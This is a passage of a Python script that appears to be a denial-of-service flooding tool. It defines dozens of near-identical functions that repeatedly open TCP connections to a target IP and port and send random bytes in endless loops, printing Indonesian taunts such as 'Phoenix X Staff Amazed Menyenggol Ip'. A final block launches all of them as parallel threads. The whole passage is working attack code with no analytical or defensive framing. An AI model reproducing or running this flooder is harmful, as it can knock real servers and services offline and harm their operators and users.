    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run79():
    data = random._urandom(1025)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run80():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run81():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run82():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run83():
    data = random._urandom(1025)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run84():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run85():
    data = random._urandom(999)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run86():
    data = random._urandom(17)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run87():
    data = random._urandom(666)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run88():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run89():
    data = random._urandom(1180)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run90():
    data = random._urandom(1025)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run91():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run92():
    data = random._urandom(1800)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run93():
    data = random._urandom(1818)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run94():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run95():
    data = random._urandom(17)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run96():
    data = random._urandom(1180)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run97():
    data = random._urandom(17)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run98():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run99():
    data = random._urandom(1180)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run100():
    data = random._urandom(1025)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

#Line 70
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()
		th = threading.Thread(target = run9)
		th.start()
		th = threading.Thread(target = run10)
		th.start()
		th = threading.Thread(target = run11)
		th.start()
		th = threading.Thread(target = run12)
		th.start()
		th = threading.Thread(target = run13)
		th.start()
		th = threading.Thread(target = run14)
		th.start()
		th = threading.Thread(target = run15)
		th.start()
		th = threading.Thread(target = run16)
		th.start()
		th = threading.Thread(target = run17)
		th.start()
		th = threading.Thread(target = run18)
		th.start()
		th = threading.Thread(target = run19)
		th.start()
		th = threading.Thread(target = run20)
		th.start()
		th = threading.Thread(target = run21)
		th.start()
		th = threading.Thread(target = run22)
		th.start()
		th = threading.Thread(target = run23)
		th.start()
		th = threading.Thread(target = run24)
		th.start()
		th = threading.Thread(target = run25)
		th.start()
		th = threading.Thread(target = run26)
		th.start()
		th = threading.Thread(target = run27)
		th.start()
		th = threading.Thread(target = run28)
		th.start()
		th = threading.Thread(target = run29)
		th.start()
		th = threading.Thread(target = run30)
		th.start()
		th = threading.Thread(target = run31)
		th.start()
		th = threading.Thread(target = run32)
		th.start()
		th = threading.Thread(target = run33)
		th.start()
		th = threading.Thread(target = run34)
		th.start()
		th = threading.Thread(target = run35)
		th.start()
		th = threading.Thread(target = run36)
		th.start()
		th = threading.Thread(target = run37)
		th.start()
		th = threading.Thread(target = run38)
		th.start()
		th = threading.Thread(target = run39)
		th.start()
		th = threading.Thread(target = run40)
		th.start()
		th = threading.Thread(target = run41)
		th.start()
		th = threading.Thread(target = run42)
		th.start()
		th = threading.Thread(target = run43)
		th.start()
		th = threading.Thread(target = run44)
		th.start()
		th = threading.Thread(target = run45)
		th.start()
		th = threading.Thread(target = run46)
		th.start()
		th = threading.Thread(target = run47)
		th.start()
		th = threading.Thread(target = run48)
		th.start()
		th = threading.Thread(target = run49)
		th.start()
		th = threading.Thread(target = run50)
		th.start()
		th = threading.Thread(target = run51)
		th.start()
		th = threading.Thread(target = run52)
		th.start()
		th = threading.Thread(target = run53)
		th.start()
		th = threading.Thread(target = run54)
		th.start()
		th = threading.Thread(target = run55)
		th.start()
		th = threading.Thread(target = run56)
		th.start()
		th = threading.Thread(target = run57)
		th.start()
		th = threading.Thread(target = run58)
		th.start()
		th = threading.Thread(target = run59)
		th.start()
		th = threading.Thread(target = run60)
		th.start()
		th = threading.Thread(target = run61)
		th.start()
		th = threading.Thread(target = run62)
		th.start()
		th = threading.Thread(target = run63)
		th.start()
		th = threading.Thread(target = run64)
		th.start()
		th = threading.Thread(target = run65)
		th.start()
		th = threading.Thread(target = run66)
		th.start()
		th = threading.Thread(target = run67)
		th.start()
		th = threading.Thread(target = run68)
		th.start()
		th = threading.Thread(target = run69)
		th.start()
		th = threading.Thread(target = run70)
		th.start()
		th = threading.Thread(target = run71)
		th.start()
		th = threading.Thread(target = run72)
		th.start()
		th = threading.Thread(target = run73)
		th.start()
		th = threading.Thread(target = run74)
		th.start()
		th = threading.Thread(target = run75)
		th.start()
		th = threading.Thread(target = run76)
		th.start()
		th = threading.Thread(target = run77)
		th.start()
		th = threading.Thread(target = run78)
		th.start()
		th = threading.Thread(target = run79)
		th.start()
		th = threading.Thread(target = run80)
		th.start()
	else:
		th = threading.Thread(target = run81)
		th.start()
		th = threading.Thread(target = run82)
		th.start()
		th = threading.Thread(target = run83)
		th.start()
		th = threading.Thread(target = run84)
		th.start()
		th = threading.Thread(target = run85)
		th.start()
		th = threading.Thread(target = run86)
		th.start()
		th = threading.Thread(target = run87)
		th.start()
		th = threading.Thread(target = run88)
		th.start()
		th = threading.Thread(target = run89)
		th.start()
		th = threading.Thread(target = run90)
		th.start()
		th = threading.Thread(target = run91)
		th.start()
		th = threading.Thread(target = run92)
		th.start()
		th = threading.Thread(target = run93)
		th.start()
		th = threading.Thread(target = run94)
		th.start()
		th = threading.Thread(target = run95)
		th.start()
		th = threading.Thread(target = run96)
		th.start()
		th = threading.Thread(target = run97)
		th.start()
		th = threading.Thread(target = run98)
		th.start()
		th = threading.Thread(target = run99)
		th.start()
		th = threading.Thread(target = run100)
		th.start()